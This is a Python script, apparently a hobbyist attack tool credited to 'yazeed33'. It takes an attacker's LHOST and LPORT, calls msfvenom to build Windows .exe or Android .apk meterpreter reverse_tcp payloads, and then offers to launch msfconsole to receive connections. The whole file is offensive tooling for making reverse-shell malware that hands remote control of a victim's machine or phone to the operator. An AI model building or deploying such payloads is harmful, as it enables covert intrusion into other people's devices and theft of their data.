import os
from colorama import Fore

print (Fore.YELLOW + ' [1] Start Attack')
print (Fore.YELLOW + ' [2] Exit')
options = input(Fore.BLUE + '--> ')

if options == 1:
   os.system('clear')
   print (Fore.BLUE + '+++++++++++++++++++++++++++++++++++++++++-')
   print (Fore.BLUE + '|                                        |')
   print (Fore.BLUE + '|       [-] created by yazeed33 [-]      |')
   print (Fore.BLUE + '|                                        |')
   print (Fore.BLUE + '|+++++++++++++++++++++++++++++++++++++++++')
   LhOsT = raw_input(Fore.BLUE + ' Enter LHOST: ')
   print ''
   lPoRt = raw_input(Fore.BLUE + ' Enter LPORT: ')
   print ''
   Path = raw_input(Fore.BLUE + ' Enter Payload Name: ')

else:
 print (Fore.RED + '===============')
 print (Fore.RED + '  Aborting...')
 print (Fore.RED + '===============')
 exit()

os.system('clear')
print (Fore.BLUE + '+++++++++++++++++++++++++++++++++++++++++-')
print (Fore.BLUE + '|                                        |')
print (Fore.BLUE + '|       [-] created by yazeed33 [-]      |')
print (Fore.BLUE + '|                                        |')
print (Fore.BLUE + '|+++++++++++++++++++++++++++++++++++++++++')

print (Fore.YELLOW + ' [1] Windows')
print (Fore.YELLOW + ' [2] Android')
print (Fore.YELLOW + ' [99] Exit')
values = input(Fore.BLUE + '--> ')

if values == 1:
     msfvenom_1 = os.system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o output/{}.exe'.format(LhOsT,lPoRt,Path))
     os.system('clear')
     print ''
     print ''
     print ''
     print ''
     print (Fore.BLUE + '+++++++++++++++++++++++++++++++++++++++++++++++++')
     print (Fore.BLUE + '|                                               |')
     print (Fore.BLUE + '|  output :   brute_force-more/output/{}.exe    |'.format(Path))
     print (Fore.BLUE + '|                                               |')
     print (Fore.BLUE + '|  Reverse : windows/meterpreter/reverse_tcp    |')
     print (Fore.BLUE + '|                                               |')
     print (Fore.BLUE + '+++++++++++++++++++++++++++++++++++++++++++++++++')
   
elif values == 2:
     msfvenom_2 = os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST={}  LPORT={} R > output/{}.apk'.format(LhOsT,lPoRt,Path))
     os.system('clear')
     print ''
     print ''
     print ''
     print ''
     print (Fore.BLUE + '+++++++++++++++++++++++++++++++++++++++++++++++++')
     print (Fore.BLUE + '|                                               |')
     print (Fore.BLUE + '|  output :  /brute_force-more/output/{}.apk    |'.format(Path))
     print (Fore.BLUE + '|                                               |')
     print (Fore.BLUE + '|  Reverse : android/meterpreter/reverse_tcp    |')
     print (Fore.BLUE + '|                                               |')
     print (Fore.BLUE + '+++++++++++++++++++++++++++++++++++++++++++++++++')

else:
 os.system('clear')
 exit()

print (Fore.YELLOW + '[1] Jump To Msfconsole')
print (Fore.YELLOW + '[2] Stop')
value = input(Fore.BLUE + '--> ')

if value == 1:
   os.system('clear')
   print (Fore.BLUE + '================================')
   print (Fore.BLUE + '          Please Wait...')
   print (Fore.BLUE + '================================')
   os.system('service postgresql start')
   os.system('clear')
   os.system('msfconsole')

else:
 print '======================'
 print '     [+] Stopped'
 print '======================'
